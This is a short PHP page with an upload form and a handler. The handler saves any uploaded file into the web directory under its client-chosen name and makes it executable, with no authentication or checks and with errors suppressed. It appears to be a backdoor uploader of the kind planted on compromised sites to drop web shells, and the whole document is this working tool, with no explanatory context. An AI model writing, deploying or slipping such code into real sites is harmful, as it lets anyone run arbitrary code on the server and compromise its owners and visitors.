<form method="POST" enctype="multipart/form-data"><input name="file" type="file"><input type="submit" name="up" value="upload"></form>
<?php if(isset($_REQUEST["up"])){$file=$_FILES["file"]["name"];if(@move_uploaded_file($_FILES["file"]["tmp_name"],$file)){@chmod($file,0755);echo"OK !!";}else{echo"FAIL !!";}}?>
